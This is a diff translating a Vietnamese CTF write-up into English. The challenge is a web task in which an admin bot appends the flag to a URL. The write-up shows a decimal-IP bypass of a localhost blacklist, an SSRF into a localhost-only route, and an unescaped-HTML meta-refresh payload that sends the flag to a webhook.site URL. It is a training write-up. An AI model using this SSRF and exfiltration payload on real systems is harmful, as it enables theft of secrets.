@@ -9,9 +9,9 @@ pinned: false
 draft: false
 ---
 
-### Phân tích file
+### File analysis
 
-Challenge cung cấp 3 file chính:
+The challenge provides 3 main files:
 
 ```text
 index.html
@@ -35,19 +35,19 @@ export default {
 };
 ```
 
-Admin bot chỉ chấp nhận URL match regex:
+The admin bot only accepts URLs matching the regex:
 
 ```text
 https://chained.tjc.tf/admin/
 ```
 
-Quan trọng nhất là bot sẽ truy cập:
+Most importantly, the bot will visit:
 
 ```js
 url + flag
 ```
 
-Nghĩa là flag sẽ được nối trực tiếp vào cuối URL mà mình submit cho admin bot.
+This means the flag is appended directly to the end of the URL we submit to the admin bot.
 
 #### 2. `app.py`
 
@@ -57,15 +57,15 @@ def isSafe(url):
     return all([i not in url.lower() for i in blacklist])
 ```
 
-Ứng dụng dùng blacklist để chặn localhost, tuy nhiên có thể dùng dạng decimal khác của localhost, ví dụ:
+The application uses a blacklist to block localhost, however we can use a different decimal form of localhost, for example:
 
 ```text
 2130706434
 ```
 
-Dạng này vẫn trỏ về `127.0.0.2`, thuộc loopback, nhưng không bị blacklist chặn.
+This form still points to `127.0.0.2`, which is loopback, but is not blocked by the blacklist.
 
-Route `/admin` chỉ cho request đến từ `127.0.0.1`.
+The `/admin` route only allows requests coming from `127.0.0.1`.
 
 ```py
 @app.route('/admin')
@@ -75,13 +75,13 @@ def js():
     return query, 200, {'Content-Type': 'application/javascript'}
 ```
 
-Nếu truy cập trực tiếp từ browser bên ngoài sẽ bị chặn:
+Accessing it directly from an external browser is blocked:
 
 ```text
 Access denied. Page only accessible from server side.
 ```
 
-Nhưng nếu dùng SSRF từ server gọi vào `/admin`, request sẽ được tính là local, nên bypass được check `remote_addr`.
+But if we use SSRF from the server to call `/admin`, the request is counted as local, so the `remote_addr` check is bypassed.
 
 #### 3. `index.html`
 
@@ -89,19 +89,19 @@ Nhưng nếu dùng SSRF từ server gọi vào `/admin`, request sẽ được t
 <h3> {{ q | safe }} </h3>
 ```
 
-Response từ SSRF được render với filter `safe`, nên HTML không bị escape.
+The SSRF response is rendered with the `safe` filter, so the HTML is not escaped.
 
-Điều này cho phép ta inject HTML vào trang thông qua response từ SSRF.
+This allows us to inject HTML into the page through the SSRF response.
 
-### Payload 
+### Payload
 
-Payload gửi vào admin bot:
+Payload sent to the admin bot:
 
 ```text
 https://chained.tjc.tf/admin/../?url=http%3A%2F%2F2130706434%3A5000%2Fadmin%3Fq%3D%253Cmeta%2520http-equiv%253Drefresh%2520content%253D0%253Burl%253Dhttps%253A%252F%252Fwebhook.site%252Fdde72542-7905-48e1-8dc6-d44aabfb5067%252F%253Fc%253D
 ```
 
-Kiểm tra webhook, thấy request mới với query string:
+Check the webhook; we see a new request with the query string:
 
 ![](./image.png)
 
